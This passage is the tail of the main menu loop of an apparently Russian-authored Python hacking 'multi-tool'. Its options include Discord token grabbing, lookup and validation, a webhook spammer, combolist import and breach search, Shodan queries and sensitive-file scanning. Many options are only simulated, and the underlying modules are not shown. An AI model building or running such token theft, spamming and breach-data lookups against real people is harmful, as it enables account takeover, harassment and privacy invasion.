                        print(f"  {k}: {v}")
            input("Press Enter...")
        elif choice == '15':
            domain = input("Enter domain: ")
            result = web.dns_zone_transfer(domain)
            if result:
                print("Zone transfer success!")
                for k, v in list(result.items())[:3]:
                    print(f"  {k}: {v}")
            else:
                print("Zone transfer failed")
            input("Press Enter...")
        elif choice == '16':
            cves = cve_scanner.check_cve('apache', '2.4')
            for c in cves:
                print(f"{c['id']}: {c['description']}")
            input("Press Enter...")
        elif choice == '17':
            ip = input("Enter IP: ")
            print(f"Honeypot check simulated: {'low risk'}")
            input("Press Enter...")
        elif choice == '18':
            domain = input("Enter domain: ")
            backups = ['backup.zip', 'config.bak', 'database.sql']
            print("Backup files (simulated):")
            for b in backups:
                print(f"  {b}")
            input("Press Enter...")
        elif choice == '19':
            domain = input("Enter domain: ")
            print("Cookie analysis simulated")
            input("Press Enter...")
        elif choice == '20':
            domain = input("Enter domain: ")
            print("WAF detection simulated: Cloudflare")
            input("Press Enter...")
        elif choice == '21':
            user_id = input("Enter Discord ID: ")
            result = discord.get_token_by_id(user_id)
            if result['found']:
                print(f"Found {len(result['tokens'])} tokens")
                for t in result['tokens']:
                    print(f"  {t}")
            else:
                print("No tokens found")
            input("Press Enter...")
        elif choice == '22':
            token = input("Enter Discord token: ")
            info = discord.get_token_info(token)
            if info.get('valid'):
                print(f"VALID: {info.get('username')} (ID: {info.get('id')})")
                print(f"Email: {info.get('email')}, Verified: {info.get('verified')}")
            else:
                print(f"Invalid: {info.get('error')}")
            input("Press Enter...")
        elif choice == '23':
            tokens = discord.grab_tokens()
            print(f"Found {len(tokens)} tokens locally")
            for t in tokens[:5]:
                print(f"  {t}")
            input("Press Enter...")
        elif choice == '24':
            webhook = input("Webhook URL: ")
            msg = input("Message: ")
            count = input("Count (default 10): ")
            count = int(count) if count else 10
            result = discord.webhook_spammer(webhook, msg, count)
            if result['success']:
                print(f"Sent {result['sent']} messages")
            else:
                print(f"Error: {result.get('error')}")
            input("Press Enter...")
        elif choice == '25':
            email = input("Enter email: ")
            result = osint.check_email(email)
            if result['hibp']:
                print("Found in breaches!")
                for b in result.get('breaches', []):
                    print(f"  {b.get('Name')}")
            else:
                print("Not found in breaches")
            input("Press Enter...")
        elif choice == '26':
            phone = input("Enter phone: ")
            result = osint.check_phone(phone)
            print(f"Country: {result.get('country')}, Operator: {result.get('operator')}")
            input("Press Enter...")
        elif choice == '27':
            ip = input("Enter IP: ")
            result = osint.scan_ip(ip)
            if result.get('geo'):
                print(f"Country: {result['geo'].get('country')}")
            print(f"Open ports: {result.get('ports', [])}")
            input("Press Enter...")
        elif choice == '28':
            username = input("Enter username: ")
            results = osint.username_search(username)
            found = [p for p, d in results.items() if d.get('found')]
            print(f"Found on {len(found)} platforms")
            input("Press Enter...")
        elif choice == '29':
            email = input("Email: ")
            password = input("Password: ")
            result = breach.check_combolist(email, password)
            print("Found!" if result['found'] else "Not found")
            input("Press Enter...")
        elif choice == '30':
            query = input("Search query: ")
            results = breach.search_breach(query)
            print(f"Found {len(results)} entries")
            input("Press Enter...")
        elif choice == '31':
            filepath = input("File path: ")
            if os.path.exists(filepath):
                result = breach.import_combolist(filepath)
                print(f"Imported {result.get('imported', 0)} entries")
            else:
                print("File not found")
            input("Press Enter...")
        elif choice == '32':
            term = input("Search term: ")
            print("Searching databases...")
            input("Press Enter...")
        elif choice == '33':
            report.add_section('test', {'data': 'example'})
            report.save_text('report.txt')
            report.save_json('report.json')
            print("Reports saved")
            input("Press Enter...")
        elif choice == '34':
            print(f"Users: {db.count('users.db', 'users')}")
            print(f"Tokens: {db.count('tokens.db', 'tokens')}")
            print(f"Emails: {db.count('emails.db', 'emails')}")
            input("Press Enter...")
        elif choice == '35':
            first = input("First name: ")
            last = input("Last name: ")
            domain = input("Domain: ")
            emails = osint.generate_emails(first, last, domain)
            for e in emails:
                print(f"  {e}")
            input("Press Enter...")
        elif choice == '36':
            length = input("Length (default 12): ")
            length = int(length) if length else 12
            print(f"Password: {generate_random_password(length)}")
            input("Press Enter...")
        elif choice == '37':
            data = input("Text: ")
            print(f"MD5: {calculate_hash(data, 'md5')}")
            print(f"SHA256: {calculate_hash(data, 'sha256')}")
            input("Press Enter...")
        elif choice == '38':
            data = input("Text: ")
            print(f"Base64: {base64_encode(data)}")
            input("Press Enter...")
        elif choice == '39':
            colors = list(COLORS.keys())
            for i, c in enumerate(colors, 1):
                print(f"{COLORS[c]}{i}. {c.capitalize()}{Style.RESET_ALL}")
            sel = int(input("Select: "))
            if 1 <= sel <= len(colors):
                set_color(colors[sel-1])
                print("Color changed")
            input("Press Enter...")
        elif choice == '40':
            domain = input("Domain: ")
            cert = ssl_analyzer.get_cert_info(domain)
            if 'error' in cert:
                print(cert['error'])
            else:
                print(cert)
            input("Press Enter...")
        elif choice == '41':
            cves = cve_scanner.check_cve('apache', '2.4')
            for c in cves:
                print(c)
            input("Press Enter...")
        elif choice == '42':
            filepath = input("Image path: ")
            if os.path.exists(filepath):
                print(meta_analyzer.analyze_image(filepath))
            else:
                print("File not found")
            input("Press Enter...")
        elif choice == '43':
            uid = input("Telegram ID: ")
            print(telegram.get_user_info(uid))
            input("Press Enter...")
        elif choice == '44':
            phone = input("Phone: ")
            print(telegram.check_phone(phone))
            input("Press Enter...")
        elif choice == '45':
            query = input("Search query: ")
            print(darkweb.search_onion(query))
            input("Press Enter...")
        elif choice == '46':
            service = input("Service: ")
            key = input("Key: ")
            api_manager.save_key(service, key)
            print("Key saved")
            input("Press Enter...")
        elif choice == '47':
            zip_path = input("ZIP path: ")
            extract_to = input("Extract to: ")
            if os.path.exists(zip_path):
                result = archive_manager.extract_zip(zip_path, extract_to)
                print(result)
            else:
                print("File not found")
            input("Press Enter...")
        elif choice == '48':
            folder = input("Folder: ")
            zip_name = input("ZIP name: ")
            if os.path.exists(folder):
                shutil.make_archive(zip_name, 'zip', folder)
                print(f"Created {zip_name}.zip")
            else:
                print("Folder not found")
            input("Press Enter...")
        elif choice == '49':
            text = input("Text: ")
            key = input("Key: ")
            print(f"Encrypted: {xor_encrypt(text, key)}")
            input("Press Enter...")
        elif choice == '50':
            text = input("Encrypted: ")
            key = input("Key: ")
            print(f"Decrypted: {xor_decrypt(text, key)}")
            input("Press Enter...")
        elif choice == '51':
            print(f"UUID: {uuid.uuid4()}")
            input("Press Enter...")
        elif choice == '52':
            try:
                r = requests.get('https://api.ipify.org?format=json', timeout=5)
                print(f"Public IP: {r.json().get('ip')}")
            except Exception as e:
                print(f"Error: {e}")
            input("Press Enter...")
        elif choice == '53':
            ip = input("Enter subnet: ")
            try:
                net = ipaddress.ip_network(ip, strict=False)
                print(f"Scanning {net.num_addresses} hosts... (simulated)")
            except Exception as e:
                print(f"Error: {e}")
            input("Press Enter...")
        elif choice == '54':
            ip = input("IP: ")
            ports = input("Ports (comma): ")
            print(f"Port knocking simulated on {ip}: {ports}")
            input("Press Enter...")
        elif choice == '55':
            ip = input("IP: ")
            port = input("Port: ")
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, int(port)))
                s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                data = s.recv(1024)
                print(data[:200].decode('utf-8', errors='ignore'))
                s.close()
            except Exception as e:
                print(f"Error: {e}")
            input("Press Enter...")
        elif choice == '56':
            url = input("URL: ")
            try:
                r = requests.get(url, timeout=5)
                print(f"Status: {r.status_code}, Time: {r.elapsed.total_seconds()}s")
            except Exception as e:
                print(f"Error: {e}")
            input("Press Enter...")
        elif choice == '57':
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('8.8.8.8', 80))
                print(f"Local IP: {s.getsockname()[0]}")
                s.close()
            except:
                print("Could not determine local IP")
            input("Press Enter...")
        elif choice == '58':
            host = input("Host: ")
            try:
                import subprocess
                if platform.system() == 'Windows':
                    subprocess.call(['ping', '-n', '1', host])
                else:
                    subprocess.call(['ping', '-c', '1', host])
            except:
                print("Ping failed")
            input("Press Enter...")
        elif choice == '59':
            host = input("Host: ")
            print(f"Traceroute to {host} (simulated)")
            input("Press Enter...")
        elif choice == '60':
            query = input("Shodan search query: ")
            result = shodan_module.search(query)
            if 'error' in result:
                print(f"Error: {result['error']}")
            else:
                print(f"Found {result.get('total', 0)} results")
                for match in result.get('matches', [])[:5]:
                    print(f"  {match.get('ip_str')}:{match.get('port')} - {match.get('org', '')}")
            input("Press Enter...")
        elif choice == '61':
            ip = input("IP: ")
            result = shodan_module.host_info(ip)
            if 'error' in result:
                print(f"Error: {result['error']}")
            else:
                print(f"IP: {result.get('ip_str')}")
                print(f"ORG: {result.get('org', '')}")
                print(f"Ports: {result.get('ports', [])}")
            input("Press Enter...")
        elif choice == '62':
            root = input("Root directory (default .): ") or '.'
            if os.path.exists(root):
                found = file_scanner.scan_sensitive_files(root)
                for pattern, files in found.items():
                    if files:
                        print(f"{pattern}: {len(files)} files")
                        for f in files[:5]:
                            print(f"  {f}")
            else:
                print("Directory not found")
            input("Press Enter...")
        elif choice == '63':
            username = input("Username: ")
            results = social_search.search_all(username)
            found = [p for p, d in results.items() if d.get('found')]
            print(f"Found on {len(found)} platforms:")
            for p in found[:15]:
                print(f"  {p}: {results[p]['url']}")
            input("Press Enter...")
        elif choice == '64':
            email = input("Email: ")
            domain = email.split('@')[-1] if '@' in email else ''
            try:
                socket.gethostbyname(domain)
                print("Domain exists, email may be valid")
            except:
                print("Domain does not exist")
            input("Press Enter...")
        elif choice == '65':
            domain = input("Domain: ")
            print(f"Reputation check simulated: {domain} is clean")
            input("Press Enter...")
        elif choice == '66':
            length = input("Length (default 20): ")
            length = int(length) if length else 20
            print(f"Strong Password: {generate_random_password(length)}")
            input("Press Enter...")
        elif choice == '67':
            url = input("URL: ")
            try:
                resp = requests.get(url, timeout=5)
                print("Headers:")
                for k, v in resp.headers.items():
                    print(f"  {k}: {v}")
            except Exception as e:
                print(f"Error: {e}")
            input("Press Enter...")
        elif choice == '68':
            url = input("URL: ")
            dirs = ['admin', 'login', 'wp-admin', 'api', 'test']
            print("Simulated directory brute force:")
            for d in dirs:
                print(f"  {url}/{d} - 404")
            input("Press Enter...")
        elif choice == '69':
            report.add_section('example', {'data': 'Sample data'})
            report.save_html('report.html')
            print("HTML report saved")
            input("Press Enter...")
        elif choice == '70':
            print("Exiting...")
            break
        else:
            print("Invalid choice")
            time.sleep(1)

# ================================================================
# ЗАПУСК
# ================================================================

if __name__ == "__main__":
    try:
        loading_animation()
        main()
    except KeyboardInterrupt:
        print("\nInterrupted")
        sys.exit(0)
    except Exception as e:
        print(f"\nFatal error: {e}")
        traceback.print_exc()
        sys.exit(1)
